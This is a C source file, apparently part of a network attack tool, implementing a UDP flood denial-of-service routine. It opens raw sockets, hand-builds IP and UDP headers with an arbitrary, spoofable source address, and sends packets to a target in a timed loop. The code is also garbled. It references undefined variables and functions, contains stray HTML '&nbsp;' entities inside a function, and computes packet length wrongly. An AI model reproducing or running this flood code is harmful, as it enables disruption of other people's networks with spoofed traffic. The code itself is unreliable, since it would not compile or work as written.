#include <stdio.h> // printf/fprintf
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <signal.h>
#include <errno.h>

#include <netinet/ip.h>  // struct ip
#include <sys/socket.h>  // socket()
#include <netinet/in.h>  // struct sockadd
#include <netinet/udp.h> // struct udp

#include "../main.h"
#include "attack_udp_flood_dos.h"

// from ../core/core_log.c
extern int DisplayDebug(const int message_debug_level, const int user_debug_level, const char *fmt, ...);
extern int DisplayInfo(const char *fmt, ...);
extern int DisplayWarning(const char *fmtsring, ...);
extern int DisplayError(const char *fmt, ...);

static unsigned short CalculateSum(unsigned short *ptr, int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1)
    {
        oddbyte = 0;
        *((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;

    return (answer);
}

static int SendUDP(const pUDPStruct us, const int debug_level)
{

    int socket_fd;
    socket_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (socket_fd < 0)
    {
        DisplayError("Create socket failed: %s(%d)", strerror(errno), errno);
        if (errno == 1)
        {
            DisplayWarning("This program should run as root user");
        }
        else if (errno == 24)
        {
            DisplayWarning("You shoud check max file number use 'ulimit -n' in linux");
            DisplayWarning("And change the max file number use 'ulimit -n <setting number>'");
            DisplayWarning("Or you can change the EACH_IP_REPEAT_TIME value to delay the attack end time");
        }
        return 1;
    }

    struct sockaddr_in sin;

    sin.sin_family = AF_INET;
    // dst
    sin.sin_port = htons((int)us->dst_port);
    sin.sin_addr.s_addr = inet_addr(us->dst_ip);

    struct ip *ip;
    struct udphdr *udp;
    char *dgm, *data;

    int pksize = sizeof(struct ip) + sizeof(struct udphdr) + PADDING_SIZE;
    dgm = (char *)malloc(pksize);
    ip = (struct ip *)dgm;
    udp = (struct udphdr *)(dgm + sizeof(struct ip));
    data = (char *)(dgm + sizeof(struct ip) + sizeof(struct udphdr));

    memset(dgm, 0, pksize);
    memcpy((char *)data, "G", PADDING_SIZE);

    int one = 1;
    const int *val = &one;
    if (setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        DisplayError("Error setting IP_HDRINCL: %s(%d)", strerror(errno), errno);
        //exit(0);
        return 1;
    }

    char source_ip[32];
    if (!strncpy(source_ip, us->src_ipm, UDP_FLOOD_IP_BUFFER_SIZE))
    {
        DisplayError("Attack strncpy failed");
        return 1;
    }

    //entete ip
    ip->ip_v = 4;
    ip->ip_hl = 5;
    ip->ip_tos = 0;
    ip->ip_len = sizeof(pksize);
    ip->ip_ttl = 255;
    ip->ip_off = 0;
    ip->ip_id = sizeof(45);
    ip->ip_p = IPPROTO_UDP;
    ip->ip_sum = 0; // a remplir aprés
    ip->ip_src.s_addr = inet_addr(source_ip);
    ip->ip_dst.s_addr = ip_dst;

    //entete udp

    udp->uh_sport = p_src;
    udp->uh_dport = p_dst;
    udp->uh_ulen = htons(sizeof(struct udphdr) + PADDING_SIZE);
    udp->uh_sum = 0;

    // envoi
    if (sendto(sd, dgm, pksize, 0, (struct sockaddr *)&sin,
               sizeof(struct sockaddr)) == -1)
    {
        fprintf(stderr, "oops, sendto() error\n");
    }

    //libere la memoire
    free(dgm);
    close(sd);
}

static int AttackThread(const pInput input)
{
    srand(time(NULL));
    int i;

    for (i = 0; i < N_LOOP; i++)
    {
        udp("xxx.xxx.xxx.xxx");
        usleep(U_WAITING);
        printf("-");
        &nbsp;
        &nbsp;
        &nbsp;
        udp("xxx.xxx.xxx.xxx");
        usleep(U_WAITING);
        printf("+");
    }
}

int StartUDPFloodTest(const pInput input)
{
    // for test
    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Enter StartUDPFloodTest");
    AttackThread(input);
    return 0;
}
